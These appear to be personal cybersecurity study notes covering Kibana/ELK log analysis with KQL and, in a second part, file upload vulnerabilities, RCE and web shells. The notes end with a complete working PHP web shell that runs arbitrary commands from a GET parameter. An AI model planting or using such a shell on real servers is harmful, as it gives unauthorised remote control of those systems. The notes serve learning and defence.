


---
title: "<% tp.file.title %>"
draft: false
tags:
- cybersecurity
- logAnalysis
---
## Operation Blue
### Log Analysis & Introducing ELK
Combo of data analytics and processing tools to make analysing logs much more manageable.

### Using ELK
We will use Kibana Discover interface to revie Apache2 logs
A collection is a group of logs

**Kibana Discovery UAI**
![[Pasted image 20241203210804.png]]

1. **Search Bar:** Here, we can place our search queries using KQL
2. **Index Pattern:** An index pattern is a collection of logs. This can be from a specific host or, for example, multiple hosts with a similar purpose (such as multiple web servers). In this case, the index pattern is all logs relating to "wareville-rails"
3. **Fields:** This pane shows us the fields that Elasticsearch has parsed from the logs. For example, timestamp, response type, and IP address.
4. **Timeline:** This visualisation displays the event count over a period of time
5. **Documents (Logs):** These entries are the specific entries in the log file
6. **Time Filter:** We can use this to narrow down a specific time frame (absolute). Alternatively, we can search for logs based on relativity. I.e. "Last 7 days".


### Kibana Query Language (KQL)
`ip.address: "10.10.10.10"`
It can use Lucene


## Operation Red
### File Upload Vulnerabilities
- **RCE**
- **XSS**

Unrestricted file uploads can be particularly dangerous because they allow an attacker to upload any type of file.

- Uploading a script that the server executes, leading to RCE.  
    
- Uploading a crafted image file that triggers a vulnerability when processed by the server.  
    
- Uploading a web shell and browsing to it directly using a browser.

### Usage of weak credentials
Default credentials


### Remote Code Execution (RCE)
It happens when an attacker finds a way to run their own code on a system.

### What is a Web Shell
It is a script that attackers upload to a vulnerable server, giving them remote control over it.
Typically gives the attacker a web-based interface to run commands.

```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="text" name="command" autofocus id="command" size="50">
<input type="submit" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['command'])) 
    {
        system($_GET['command'] . ' 2>&1'); 
    }
?>
</pre>
</body>
</html>
```








